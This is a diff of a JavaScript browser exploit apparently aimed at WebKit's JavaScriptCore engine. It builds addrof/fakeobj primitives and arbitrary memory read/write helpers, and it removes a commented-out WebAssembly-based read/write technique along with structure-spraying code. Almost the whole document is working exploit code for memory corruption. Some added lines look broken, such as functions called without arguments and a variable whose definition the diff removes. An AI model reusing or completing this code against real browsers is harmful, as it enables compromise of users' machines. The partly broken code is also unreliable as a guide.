@@ -566,7 +566,7 @@ let pad = new Array(noCoW, 2.2, {}, 13.37);
 let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
 let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
 
-var evil_arr = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
+var evil_arr = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8); //victim
 
 var boxed = new Array(qwordAsTagged(0x41414141414141), noCoW, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
 var unboxed = new Array(noCoW, 13.37, 13.37, 13.37, 5.5, 6.6, 7.7, 8,8);
@@ -669,7 +669,8 @@ b.process = (inputs, outputs, parameters)=>{
                 break;
             }
         }
-        var addrof = (obj)=>{
+        
+        var addrof = (obj)=>{ //aka
             boxed[0] = obj;
             return floatAsQword(evil_arr[boxed_offset]);
         }
@@ -677,6 +678,69 @@ b.process = (inputs, outputs, parameters)=>{
             evil_arr[boxed_offset] = qwordAsFloat(addr);
             return boxed[0];
         }
+        
+        var memory = {
+        addrof: addrof(),
+        fakeobj: fakeObj(),
+
+        // Write an int64 to the given address.
+        writeInt64(addr, int64) {
+            evil_arr[boxed_offset] = Add(addr, 0x10).asDouble();
+            victim.prop = int64.asJSValue();
+        },
+
+        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
+        write16(addr, value) {
+            // Set butterfly of victim object and dereference.
+            evil_arr[boxed_offset] = Add(addr, 0x10).asDouble();
+            victim.prop = value;
+        },
+
+        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
+        write(addr, data) {
+            while (data.length % 4 != 0)
+                data.push(0);
+
+            var bytes = new Uint8Array(data);
+            var ints = new Uint16Array(bytes.buffer);
+
+            for (var i = 0; i < ints.length; i++)
+                this.write16(Add(addr, 2 * i), ints[i]);
+        },
+
+        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
+        read64(addr) {
+            // Set butterfly of victim object and dereference.
+            evil_arr[boxed_offset] = Add(addr, 0x10).asDouble();
+            return this.addrof(victim.prop);
+        },
+
+        // Verify that memory read and write primitives work.
+        test() {
+            var v = {};
+            var obj = {p: v};
+
+            var addr = this.addrof(obj);
+            assert(this.fakeobj(addr).p == v, "addrof and/or fakeobj does not work");
+
+            var propertyAddr = Add(addr, 0x10);
+
+            var value = this.read64(propertyAddr);
+            assert(value.asDouble() == addrof(v).asDouble(), "read64 does not work");
+
+            this.write16(propertyAddr, 0x1337);
+            assert(obj.p == 0x1337, "write16 does not work");
+        },
+    };
+
+    // Testing code, not related to exploit
+    var plainObj = {};
+    var header = memory.read64(addrof(plainObj));
+    memory.writeInt64(memory.addrof(container), header);
+    memory.test();
+    print("[+] limited memory read/write working");
+        
+        
         stage="gc_test"
         return true;
     }
@@ -709,314 +773,8 @@ b.process = (inputs, outputs, parameters)=>{
    foo({});
    foo({x:0x4141414141});
 }
-        fuck.port.postMessage(`starting`)
-        print1(`[*] Spraying structures to get a butterfly (1/2)...`);
-        //RIPPPPPPPPPP
-        /*
-        // copy paste from: 
-        // https://github.com/LinusHenze/WebKit-RegEx-Exploit    
-        var structs = [];
-        for (var i = 0; i < 0x5000; i++) {
-            var a = new Float64Array(1);
-            a["prop" + i] = 1337;
-            structs.push(a);
-        }
         
-        print1('[*] Spraying structures to get a butterfly (2/2)...');
-        for (var i = 0; i < 500; i++) {
-            var a = new WebAssembly.Memory({inital: 0});
-            a["prop" + i] = 1339;
-            structs.push(a);
-        }
         
-        print1("[*] Preparing R/W primitives...");
-        
-        var webAssemblyCode ="\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b";
-        var webAssemblyBuffer = str2ab(webAssemblyCode);
-        var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
-        
-        var jsCellHeader = new Int64([
-            0x00, 0x10, 0x00, 0x00,
-            0x0,                    
-            0x2c,                   
-            0x08,                  
-            0x1                     
-        ]);
-        
-        var wasmBuffer = {
-            jsCellHeader: jsCellHeader.asJSValue(),
-            butterfly: null,
-            vector: null,
-            memory: null,
-            deleteMe: null
-        };
-        
-        var wasmInternalMemory = {
-            jsCellHeader: null,
-            memoryToRead: {}, 
-            sizeToRead: (new Int64("0x0FFFFFFFFFFFFFFF")).asJSValue(), 
-            size: (new Int64("0x0FFFFFFFFFFFFFFF")).asJSValue(), 
-            initialSize: (new Int64("0x0FFFFFFFFFFFFFFF")).asJSValue(), 
-            junk1: null,
-            junk2: null,
-            junk3: null,
-            junk4: null,
-            junk5: null,
-        };
-        
-        var leaker = {
-            objectToLeak: null
-        };
-        delete wasmBuffer.butterfly;
-        delete wasmBuffer.vector;
-        delete wasmBuffer.deleteMe;
-        delete wasmInternalMemory.junk1;
-        delete wasmInternalMemory.junk2;
-        delete wasmInternalMemory.junk3;
-        delete wasmInternalMemory.junk4;
-        delete wasmInternalMemory.junk5;
-        
-        var realWasmMem = new WebAssembly.Memory({inital: 0x1});
-        sleep(5);
-        var wasmBufferRawAddr = addrof(wasmBuffer);
-        if (wasmBufferRawAddr == 0x7ff8000000000000) {
-            //print1("[+] Got A NAN address which invalid reloading");
-            fail("[+] Got A NAN address which is invalid ... reloading");
-        }
-        print1("[+] Got WebAssembly buffer at 0x"+wasmBufferRawAddr.toString(16));
-        let u = new Int64(wasmBufferRawAddr).toString()[9];
-        var fakeWasmBuffer = fakeobj(wasmBufferRawAddr+16);
-        var maxtry = 0;
-        
-        if (fakeWasmBuffer instanceof WebAssembly.Memory) {
-            print1("gotcha!");
-            //continue;
-        } else {
-            while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
-            jsCellHeader.assignAdd(jsCellHeader, Int64.One);
-            wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
-            maxtry++;
-            if (maxtry == 100000)
-            {
-                fail("wow 5000 tries on getting valid structid failed!!!");
-            }
-        }
-            print1("[+] Successfully got fakeobj as WASMObject");
-    } /else {
-        print1('[+] Successfully got fakeobj as WASMObject');
-    }/
-        //print1('[+] Successfully got fakeobj as WASMObject');
-        var wasmMemRawAddr = addrof(wasmInternalMemory);
-        var wasmMem = fakeobj(wasmMemRawAddr+16);    
-        
-        wasmBuffer.memory = wasmMem;
-        
-        var importObject = {
-            imports: {
-                mem: fakeWasmBuffer
-            }
-        };
-        
-        print1("[*] We now have early R/W primitives that should work with the WASM memory...");
-        
-        function read_i64(readingFunc, offset) {
-            var low = readingFunc(offset * 4);
-            var midLow = readingFunc((offset * 4) + 1);
-            var midHigh = readingFunc((offset * 4) + 2);
-            var high = readingFunc((offset * 4) + 3);
-            return Add(ShiftLeft(Add(ShiftLeft(Add(ShiftLeft(high, 2), midHigh), 2), midLow), 2), low);
-        }
-        function write_i64(writingFunc, offset, value) {
-            writingFunc(offset * 4, ShiftRight(value, 0).asInt16());
-            writingFunc((offset * 4) + 1, ShiftRight(value, 2).asInt16());
-            writingFunc((offset * 4) + 2, ShiftRight(value, 4).asInt16());
-            writingFunc((offset * 4) + 3, ShiftRight(value, 6).asInt16());
-        }
-        
-        function createObjWriter(obj) {
-            wasmInternalMemory.memoryToRead = obj;
-            var module = new WebAssembly.Instance(webAssemblyModule, importObject);
-            return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
-        }
-    
-        
-        var fakeWasmInternalBufferWriter = createObjWriter(wasmMem);
-        var wasmInternalBufferWriter = fakeWasmInternalBufferWriter;
-        
-        function createDirectWriter(address) {
-            wasmInternalBufferWriter.write_i64(1, address);
-            var module = new WebAssembly.Instance(webAssemblyModule, importObject);
-            return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
-        }
-        
-        var realWasmWriter = createObjWriter(realWasmMem);
-        var realWasmInternalMemAddr = realWasmWriter.read_i64(3);
-        wasmInternalBufferWriter = createDirectWriter(realWasmInternalMemAddr);
-        /*for (var z = 0; z < 10000; z++) {
-            var chewjittime = [0x7fff000000000000];
-            chewjittime[1] = {a:0x41312111};
-        }/
-        var leakerWriter = createObjWriter(leaker);
-        wasmInternalBufferWriter.write_i64(2, new Int64('0x0FFFFFFFFFFFFFFF'));
-        wasmInternalBufferWriter.write_i64(3, new Int64('0x0FFFFFFFFFFFFFFF'));
-        wasmInternalBufferWriter.write_i64(4, new Int64('0x0FFFFFFFFFFFFFFF'));
-        var realInternalBufferAddr = wasmInternalBufferWriter.read_i64(1);
-        importObject.imports.mem = realWasmMem;
-        
-        addrof = function(obj) {
-            leaker.objectToLeak = obj;
-            return leakerWriter.read_i64(2);
-        }
-        
-        fakeobj = function(addr) {
-            leakerWriter.write_i64(2, addr);
-            return leaker.objectToLeak;
-        }
-        
-        createObjWriter = function(obj) {
-            return createDirectWriter(addrof(obj));
-        }
-        
-        var writer = createObjWriter(wasmMem);
-        writer.write_i64(0, Int64.One);
-        var wasmBufferWriter = createObjWriter(wasmBuffer);
-        var writer = createObjWriter(wasmInternalMemory);
-        wasmBufferWriter.write_i64(0, new Int64('0x0000000000000007')); 
-        wasmBufferWriter.write_i64(2, new Int64('0x0000000000000007'));
-        
-        writer.write_i64(4, Int64.Zero);
-        writer.write_i64(5, Int64.Zero);
-        writer.write_i64(6, Int64.Zero);
-        writer.write_i64(7, Int64.Zero);
-        writer.write_i64(0, new Int64('0x0000000000000007'));
-        writer.write_i64(2, new Int64('0x0000000000000007'));
-        
-        print1("[*] We now have stable R/W primitives, hooray!");
-        var memory = {
-            create_writer: function(addrObj) {
-                if (addrObj instanceof Int64) {
-                    var writer = createDirectWriter(addrObj);
-                    return writer;
-                } else {
-                    var writer = createObjWriter(addrObj);
-                    return writer;
-                }
-            },
-            read_i64: function(addrObj, offset) {
-                var writer = this.create_writer(addrObj);
-                return writer.read_i64(offset);
-            },
-            write_i64: function(addrObj, offset, value) {
-                var writer = this.create_writer(addrObj);
-                writer.write_i64(offset, value);
-            },
-            read_i32: function(addrObj, offset) {
-                var writer = this.create_writer(addrObj);
-                return new Int64(writer.read_i32(offset));
-            },
-            write_i32: function(addrObj, offset, value) {
-                var writer = this.create_writer(addrObj);
-                writer.write_i32(offset, value);
-            },
-            read_i8: function(addrObj, offset) {
-                var writer = this.create_writer(addrObj);
-                return writer.read_i8(offset);
-            },
-            write_i8: function(addrObj, offset, value) {
-                var writer = this.create_writer(addrObj);
-                writer.write_i8(offset, value);
-            },
-            write: function(addrObj, data, length) {
-                var offset = 0;
-                var writer = this.create_writer(addrObj);
-                for (var i = 0; i < length; i++) {
-                    writer.write_i8(offset + i, data[i]);
-                }
-            },
-            read: function(addrObj, length) {
-                var offset = 0;
-                var writer = this.create_writer(addrObj);
-                var arr = new Uint8Array(length);
-                for (var i = 0; i < length; i++) {
-                    arr[i] = writer.read_i8(offset + i);
-                }
-                return arr;
-            },
-            readInt64: function(addrObj) {
-                //var offset = 0;
-                //var writer = this.create_writer(addrObj);
-                return this.read_i64(addrObj,0);
-            },
-            writeInt64: function(addrObj, offset, value) {
-                var writer = this.create_writer(addrObj);
-                writer.write_i64(offset, value);
-            },
-            copyfrom: function(addrObj, offset, length) {
-                offset = 0;
-                var writer = this.create_writer(addrObj);
-                var arr = new Uint8Array(length);
-                for (var i = 0; i < length; i++) {
-                    arr[i] = writer.read_i8(offset + i);
-                }
-                return arr;
-            },
-            write_non_zero: function(where, what) {
-            for (var i = 0; i < what.length; ++i) {
-                if (what[i] != 0) {
-                        this.write_i64(where + i*8, 0, what[i])
-                }
-            }
-           },
-        }
-        */ //RIPPPPPPPPP Technique fuck you gigacage :(
-         // verify basic exploit primitives work.
-    var addr = addrof({p: 0x1337});
-    if(fakeobj(addr).p == 0x1337) {
-    print1(`[+] exploit primitives working`);
-    }
-
-
-    // from saelo: spray structures to be able to predict their IDs.
-    // from Auxy: I am not sure about why spraying. i change the code to:
-    //
-    // var structs = []
-    // var i = 0;
-    // var abc = [13.37];
-    // abc.pointer = 1234;
-    // abc['prop' + i] = 13.37;
-    // structs.push(abc);
-    // var victim = structs[0];
-    //
-    // and the payload still work stablely. It seems this action is redundant
-    var structs = []
-    for (var i = 0; i < 0x1000; ++i) {
-        var array = [13.37];
-        array.pointer = 1234;
-        array["prop" + i] = 13.37;
-        structs.push(array);
-    }
-
-    // take an array from somewhere in the middle so it is preceeded by non-null bytes which
-    // will later be treated as the butterfly length.
-    var victim = structs[0x800];
-    print1(`[+] victim @` + addrof(victim));
-
-    // craft a fake object to modify victim
-    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
-    var container = {
-        header: flags_double_array,
-        butterfly: victim
-    };
-
-    // create object having |victim| as butterfly.
-    var containerAddr = addrof(container);
-    print1(`[+] container @`+containerAddr);
-    // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(Add(containerAddr, 0x10));
-    // origButterfly is now based on the offset of **victim** 
-    // because it becomes the new butterfly pointer
-    // and hax[1] === victim.pointer
-    var origButterfly = hax[1];
 
     var memory = {
         addrof: addrof,
